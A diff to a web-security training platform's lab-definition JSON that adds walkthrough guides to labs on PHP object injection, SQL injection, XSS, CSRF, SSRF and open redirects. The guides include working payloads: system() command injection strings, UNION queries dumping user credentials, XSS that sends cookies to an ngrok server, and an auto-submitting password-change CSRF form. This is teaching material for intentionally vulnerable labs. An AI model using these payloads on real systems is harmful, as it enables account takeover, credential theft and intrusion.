@@ -136,27 +136,32 @@
             }
         ],
         "guide": null,
-        "isPlayground": false,
-        "imageNames": ""
+        "imageNames": null,
+        "isPlayground": false
     },
     {
         "_id": {
             "$oid": "6253f5a979222e5692f6ed8f"
         },
         "title": "Lab 07: PHP Object Injection",
-        "description": "Not implemented yet",
-        "location": null,
-        "disabled": true,
+        "description": "This lab is vulnerable to PHP Object Injection. Create a file name flag.txt under /tmp and click on 'Check point' to complete the lab",
+        "location": "VulnWeb/object_injection",
+        "disabled": false,
         "steps": [
             {
                 "description": "Deploy the machine",
                 "id": 1,
                 "point": 1
+            },
+            {
+                "description": "Create the file /tmp/flag.txt",
+                "id": 1,
+                "point": 9
             }
         ],
-        "guide": null,
+        "guide": "### Walkthrough:  \n\n  -&nbsp; List file: `O:18:\"PHPObjectInjection\":1:{s:6:\"inject\";s:13:\"system(%27ls%27);\";}`  \n\n -&nbsp; Current folder: `O:18:\"PHPObjectInjection\":1:{s:6:\"inject\";s:14:\"system(%27pwd%27);\";}`  \n\n -&nbsp; Current user: `O:18:\"PHPObjectInjection\":1:{s:6:\"inject\";s:17:\"system(%27whoami%27);\";}`  \n\n -&nbsp; Create file:  `O:18:\"PHPObjectInjection\":1:{s:6:\"inject\";s:30:\"system(%27touch+/tmp/flag.txt%27);\";}`",
         "isPlayground": false,
-        "imageNames": ""
+        "imageNames": "app_object_injection"
     },
     {
         "_id": {
@@ -224,26 +229,33 @@
         "disabled": false,
         "guide": "### Walkthrough:  \n\n -&nbsp; Step 1: In username: `admin' OR 1=1#` (let the password empty)  \n\n -&nbsp; Step 2: In password: `aaaaa' OR '1'='1`  \n\n -&nbsp; Step 3: \n  - -&nbsp; Determine number of columns by `UNION query`, in search: `1080' UNION SELECT null#`, the server returns sql error. Increase the number of 'null' you will see that with query `1080' UNION SELECT null,null,null#` the server won't raise error anymore (which mean the vulnerable query returns 3 columns in response table)  \n  - -&nbsp; Determine the name of database: `1080' UNION SELECT schema_name,null,null FROM information_schema.schemata#`  \n  - -&nbsp; Determine the name of table: `' UNION SELECT null,table_schema,table_name FROM information_schema.tables WHERE table_schema = 'test_mysql'#`  \n  - -&nbsp; Determine the name of column: `a' UNION SELECT column_name,table_name,null FROM information_schema.columns WHERE table_schema = 'test_mysql'#`  \n  - -&nbsp; Now we have enough informations about the database, time to extract its data: `aa' UNION SELECT user_name,user_password,null FROM users#`  \n\n -&nbsp; Login with that credential to complete the last step",
         "isPlayground": false,
-        "imageNames": "app_sqli,db_sqli"
+        "imageNames": "app_sqli,db_sqli",
+        "timeout": 7
     },
     {
         "_id": {
             "$oid": "6253f5a979222e5692f6ed92"
         },
         "title": "Lab 11: Automated SQL Injection with SQLMap",
-        "description": "Not implemented yet",
-        "location": null,
-        "disabled": true,
+        "description": "This lab is the same as the previous lab 'sql', but some data and vulnerable endpoints have changed. You will need to login as 'root' user to complete the lab. Here is your credential: user:password",
+        "location": "VulnWeb/sqlmap",
+        "disabled": false,
         "steps": [
             {
                 "description": "Deploy the machine",
                 "id": 1,
                 "point": 1
+            },
+            {
+                "description": "Login as root",
+                "id": 1,
+                "point": 9
             }
         ],
-        "guide": null,
+        "guide": "### Requirements:  \n\n -&nbsp; Burpsuite and a browser has configured&nbsp;[proxy](https://portswigger.net/burp/documentation/desktop/external-browser-config/browser-config-firefox) and [certificate](https://portswigger.net/burp/documentation/desktop/external-browser-config/certificate/ca-cert-firefox).  \n\n -&nbsp; [Sqlmap](https://github.com/sqlmapproject/sqlmap): Already installed on Kali Linux  \n\n -&nbsp; Credential: `user:password`  \n\n  ",
         "isPlayground": false,
-        "imageNames": ""
+        "imageNames": "app_sqlmap,db_sqlmap",
+        "timeout": 7
     },
     {
         "_id": {
@@ -286,26 +298,33 @@
         "disabled": false,
         "guide": "### Requirements:  \n\n -&nbsp; Burpsuite and a browser has configured&nbsp;[proxy](https://portswigger.net/burp/documentation/desktop/external-browser-config/browser-config-firefox)&nbsp; and &nbsp;[certificate](https://portswigger.net/burp/documentation/desktop/external-browser-config/certificate/ca-cert-firefox).  \n\n -&nbsp; [Python3](https://www.python.org/downloads/) and [ngrok](https://ngrok.com/), make sure you have authenticated ngrok binary (If you have Burpsuite Pro, use Burp Collaborator instead) \n\n -&nbsp; Credential: `User1:password`  \n\n ### Walkthrough:  \n\n -&nbsp; Take a look at the search function and try to input `'\"><script>alert(1)</script>`, you will see an alert is opened, like this.  \n\n ![1](/public/14/1.jpg)  \n\n -&nbsp; The website has a report function which receives an URL, there should be an admin checks every URL you report, try to grab his cookie.  \n\n -&nbsp; Open a terminal and run this: `python3 -m http.server 8000`. This will run a simple HTTP server on your localhost:8000 at the current folder, you can access it via your browser. But you will need a public IP to receive the data (our server doesn't know your localhost). The terminal will look like this  \n\n ![step-2](/public/15/2.jpg)  \n\n -&nbsp; Open another terminal, go to the location of ngrok binary and run: `ngrok http 8000`. This will open a tunnel from ngrok to your python HTTP server. The output looks like this:  \n\n ![step-3](/public/15/3.jpg)  \n\n -&nbsp; You will receive a public URL like this  https://*.ngrok.io, when you visit it, it will forward the traffic to your local python HTTP server. Nice!! Now we have a public server on the internet. COPY THAT URL.  \n\n -&nbsp; `'\"><script>document.location=\"YOUR_URL_HERE?c=\"+document.cookie</script>`, copy this payload, replace with your url and send it to Burp Decoder > Encode > As URL  \n\n -&nbsp; Copy the URL encoded payload  \n\n -&nbsp; To exploit Reflected-XSS, you will need to build an URL from vulnarable site and delivery it to the victim. Once the victim clicks the link, XSS payload will execute.  \n\n -&nbsp; The payload to grab victim cookie will look like this: `https://vulnerablesite.com/vulnerable/path?vulnerable_param='XSS_PAYLOAD_HERE'`  \n\n -&nbsp; Your payload should be like this: `https://xxxx.kbklab.tech/posts/search?content='PAYLOAD_WITH_URL_ENCODED'`, submit it to Report URL function and take a look on python terminal  \n\n ![2](/public/14/2.jpg)  \n\n -&nbsp; The secret cookie returns like above take it and add as a new cookie, send it to /homepage, use burp repeater as below.  \n\n ![3](/public/14/3.jpg)", 
         "isPlayground": false,
-        "imageNames": "app_rxss"
+        "imageNames": "app_rxss",
+        "timeout": 7
     },
     {
         "_id": {
             "$oid": "6253f5a979222e5692f6ed95"
         },
         "title": "Lab 12: Blind SQL injection",
-        "description": "Not implemented yet",
-        "location": null,
-        "disabled": true,
+        "description": "Same as other SQLi lab, but you can't see anything. Login as root to complete the lab",
+        "location": "VulnWeb/blind_sqli",
+        "disabled": false,
         "steps": [
             {
                 "description": "Deploy the machine",
                 "id": 1,
                 "point": 1
+            },
+            {
+                "description": "Login as root",
+                "id":1,
+                "point":9
             }
         ],
-        "guide": null,
+        "guide": "### Requirements:  \n\n -&nbsp; Burpsuite and a browser has configured&nbsp;[proxy](https://portswigger.net/burp/documentation/desktop/external-browser-config/browser-config-firefox) and [certificate](https://portswigger.net/burp/documentation/desktop/external-browser-config/certificate/ca-cert-firefox).  \n\n -&nbsp; Credential: `user:password`  \n\n  ",
         "isPlayground": false,
-        "imageNames": ""
+        "imageNames": "app_blind_sqli",
+        "timeout": 7
     },
     {
         "_id": {
@@ -329,26 +348,33 @@
         ],
         "guide": "### Requirements:  \n\n -&nbsp; Burpsuite and a browser has configured&nbsp;[proxy](https://portswigger.net/burp/documentation/desktop/external-browser-config/browser-config-firefox) and [certificate](https://portswigger.net/burp/documentation/desktop/external-browser-config/certificate/ca-cert-firefox).  \n\n -&nbsp; [Python3](https://www.python.org/downloads/) and [ngrok](https://ngrok.com/), make sure you have authenticated ngrok binary (If you have Burpsuite Pro, use Burp Collaborator instead) \n\n -&nbsp; Credential: `User1:password`  \n\n ### Walkthrough:  \n\n -&nbsp; Take a look at the comment function and try to input `'\"><script>alert(1)</script>`, you will see an alert is opened, like this.  \n\n ![step-1](/public/15/1.jpg)  \n\n  -&nbsp; As mentioned in the description, other users are using the web, to try to grab their cookie  \n\n -&nbsp; Open a terminal and run this: `python3 -m http.server 8000`. This will run a simple HTTP server on your localhost:8000 at the current folder, you can access it via your browser. But you will need a public IP to receive the data (our server doesn't know your localhost). The terminal will look like this  \n\n ![step-2](/public/15/2.jpg)  \n\n -&nbsp; Open another terminal, go to the location of ngrok binary and run: `ngrok http 8000`. This will open a tunnel from ngrok to your python HTTP server. The output looks like this:  \n\n ![step-3](/public/15/3.jpg)  \n\n -&nbsp; You will receive a public URL like this  https://*.ngrok.io, when you visit it, it will forward the traffic to your local python HTTP server. Nice!! Now we have a public server on the internet. COPY THAT URL.  \n\n -&nbsp; In commnent, input the following: `'\"><script>document.location=\"YOUR_URL_HERE?c=\"+document.cookie</script>`, remember to replace YOUR_URL_HERE with above url and wait for 2 minutes or more  \n\n ![step-4](/public/15/4.jpg)  \n\n -&nbsp; The secret cookie returns like above take it and add as a new cookie, send it to /posts/search, use burp repeater as below.  \n\n ![step-5](/public/15/5.jpg)",
         "isPlayground": false,
-        "imageNames": "app_stored_xss"
+        "imageNames": "app_stored_xss",
+        "timeout": 7
     },
     {
         "_id": {
             "$oid": "6253f5a979222e5692f6ed97"
         },
         "title": "Lab 16: DOM-Based XSS",
-        "description": "Not implemented yet",
-        "location": null,
-        "disabled": true,
+        "description": "This lab is vulnerable to dom-based xss, it's implemented as same as Reflect-XSS that there is an admin stands behind the web in 'REPORT URL' function. To complete the lab, use that admin's cookie to access /homepage",
+        "location": "VulnWeb/domxss",
+        "disabled": false,
         "steps": [
             {
                 "description": "Deploy the machine",
                 "id": 1,
                 "point": 1
+            },
+            {
+                "description": "Only one mission: obtain the admin cookie and access /homepage with it",
+                "id": 1,
+                "point": 9
             }
         ],
-        "guide": null,
+        "guide": "### Requirements:  \n\n -&nbsp; Burpsuite and a browser has configured&nbsp;[proxy](https://portswigger.net/burp/documentation/desktop/external-browser-config/browser-config-firefox)&nbsp; and &nbsp;[certificate](https://portswigger.net/burp/documentation/desktop/external-browser-config/certificate/ca-cert-firefox).  \n\n -&nbsp; [Python3](https://www.python.org/downloads/) and [ngrok](https://ngrok.com/), make sure you have authenticated ngrok binary (If you have Burpsuite Pro, use Burp Collaborator instead) \n\n -&nbsp; Credential: `User1:password`  \n\n ### Walkthrough:  \n\n -&nbsp; Checking the javascript source code of /homepage to see which one find the vulnerable paramters, after that doing the same as Reflected-XSS",
         "isPlayground": false,
-        "imageNames": ""
+        "imageNames": "app_domxss",
+        "timeout": 7
     },
     {
         "_id": {
@@ -410,7 +436,8 @@
         ],
         "guide": "### Requirements:  \n\n -&nbsp; Burpsuite and a browser has configured&nbsp;[proxy](https://portswigger.net/burp/documentation/desktop/external-browser-config/browser-config-firefox) and [certificate](https://portswigger.net/burp/documentation/desktop/external-browser-config/certificate/ca-cert-firefox).  \n\n -&nbsp; [Python3](https://www.python.org/downloads/) and [ngrok](https://ngrok.com/), make sure you have authenticated ngrok binary (If you have Burpsuite Pro, use Burp Collaborator instead) \n\n -&nbsp; Credential: `User1:password`  \n\n ### Walkthrough:  \n\n -&nbsp; Walk around the website you will found the function 'change password' is missing crsf token.  \n -&nbsp; Create a file with .html extension (ex: index.html) with the following content  \n\n `<html>`  \n `<body>`  \n `<script>history.pushState('', '', '/')</script>`  \n `<form action=\"https://*.kbklab.tech/changePassword\" method=\"POST\">`  \n `<input type=\"hidden\" name=\"newPassword\" value=\"123456789\" />`  \n `<input type=\"submit\" value=\"Submit request\" />`  \n `</form>`  \n `<script>document.forms[0].submit(); </script></body></html>`  \n -&nbsp; Or you can download it [here](/public/18/index.html)  \n\n -&nbsp; Change the url and the password in index.html to your.  \n\n -&nbsp; Open the terminal, go to the folder that contains the index.html and run `python -m http.server 8000`. This will run a simple HTTP server on your localhost:8000 at current folder, you can access it via your browser. But you will need a public IP to receive the data (our server doesn't know your localhost). The terminal will look like this  \n\n ![2](/public/15/2.jpg)  \n\n -&nbsp; Open another terminal, go to the location of ngrok binary and run: `ngrok http 8000`. This will open a tunnel from ngrok to your python HTTP server. The output looks like this:  \n ![3](/public/15/3.jpg)   \n\n -&nbsp; You will receive a public url like the this  https://*.ngrok.io, when you visit it, it will forward the traffic to your local python HTTP server. Nice!! Now we have a public server on the internet. COPY THAT URL.  \n\n  -&nbsp; In function 'Report URL', submit your URL with the index.html and wait a bit(Ex:https://aaaa.ngrok.io/index.html), you will see there is a connection to your site like this  \n\n ![1](/public/18/1.jpg)  \n\n -&nbsp; If it won't work or take too long -> DO IT AGAIN AND AGAIN  \n -&nbsp; Now, password of User2 has changed to the one in index.html  \n -&nbsp; Logout and login with User2 to complete the lab",
         "isPlayground": false,
-        "imageNames": "app_csrf"
+        "imageNames": "app_csrf",
+        "timeout": 7
     },
     {
         "_id": {
@@ -468,7 +495,8 @@
         ],
         "guide": "### Requirements:  \n\n -&nbsp; BurpSuite and a browser has configured [proxy](https://portswigger.net/burp/documentation/desktop/external-browser-config/browser-config-firefox) and [certificate](https://portswigger.net/burp/documentation/desktop/external-browser-config/certificate/ca-cert-firefox)  \n\n ### Walkthrough:  \n\n -&nbsp; The proxy will take a url and return its content.  \n\n -&nbsp; You will see the POST request to /getContent in 'Proxy' tab, right-click on the request and choose 'Send to Intruder'  \n\n -&nbsp; Try to enumerate local port by enter `http://localhost:<port>` to find which one is opened (Use python or burp intruder):  \n\n -  -&nbsp; In Intruder tab, you will see the previous request in 'Position' subtab.  \n -  -&nbsp; Click 'Clear'  \n -  -&nbsp; In url, input: `http://localhost:` and click 'Add' twice, your intruder will look like this  \n\n ![1](/public/20/1.jpg)   \n\n -  -&nbsp;Go to 'Payload' subtab, in Payload Sets > Payload type, select 'Numbers'  \n -  -&nbsp; Input as below to enum all 16 bit of ports  \n\n ![2](/public/20/2.jpg)   \n\n -&nbsp; Click 'Start Attack', after the run is completed, sort the result by length, you will see there are a secret port inside   \n\n ![3](/public/20/3.jpg)  \n\n -&nbsp; Now you have the port, try to access it file robots.txt `http://localhost:<port>/robots.txt`, you will see there is an disallow path, access it you can finish the lab.",
         "isPlayground": false,
-        "imageNames": "app_ssrf"
+        "imageNames": "app_ssrf",
+        "timeout": 5
     },
     {
         "_id": {
@@ -570,19 +598,25 @@
             "$oid": "6253f5a979222e5692f6eda2"
         },
         "title": "Lab 29: Unvalidated Redirects and Forwards",
-        "description": "Not implemented yet",
-        "location": null,
-        "disabled": true,
+        "description": "Hmm Hmm Can you delete post 2?",
+        "location": "VulnWeb/open_redirect",
+        "disabled": false,
         "steps": [
             {
                 "description": "Deploy the machine",
                 "id": 1,
                 "point": 1
+            },
+            {
+                "description": "Delete post of User2",
+                "id": 1,
+                "point": 9
             }
         ],
-        "guide": null,
+        "guide": "### Requirements:  \n\n -&nbsp; Burpsuite and a browser has configured&nbsp;[proxy](https://portswigger.net/burp/documentation/desktop/external-browser-config/browser-config-firefox) and [certificate](https://portswigger.net/burp/documentation/desktop/external-browser-config/certificate/ca-cert-firefox).  \n\n -&nbsp; Credential: `User1:password`  \n\n ### Walkthrough:  \n\n -&nbsp; In report url `https://YOUR_VULN_WEB.kbklab.tech/login?redirect_url=https://YOUR_VULN_WEB.kbklab.tech/posts/deletePost/2`",
         "isPlayground": false,
-        "imageNames": ""
+        "imageNames": "app_open_redirect",
+        "timeout": 7
     },
     {
         "_id": {
@@ -609,9 +643,10 @@
             }
         ],
         "disabled": false,
-        "guide": "this is guide `code in here`",
+        "guide": "### Requirements:  \n\n -&nbsp; Burpsuite and a browser has configured&nbsp;[proxy](https://portswigger.net/burp/documentation/desktop/external-browser-config/browser-config-firefox) and [certificate](https://portswigger.net/burp/documentation/desktop/external-browser-config/certificate/ca-cert-firefox).  \n\n -&nbsp; Credential: `User1:password`  \n\n ### Walkthrough:  \n\n -&nbsp; Following this writeup :[link](https://docs.google.com/document/d/1Q3nNwHVGUqyygb2gzCzihfVzhoFpQ0QbR9PLSHj7DCg/edit?usp=sharing)",
         "isPlayground": false,
-        "imageNames": "app_ssti,db_ssti"
+        "imageNames": "app_ssti,db_ssti",
+        "timeout": 7
     },
     {
         "_id": {
@@ -649,7 +684,8 @@
         "disabled": false,
         "guide": "this is guide `code in here`",
         "isPlayground": true,
-        "imageNames": "app_juice_shop"
+        "imageNames": "app_juice_shop",
+        "timeout": 10
     },
     {
         "_id": {
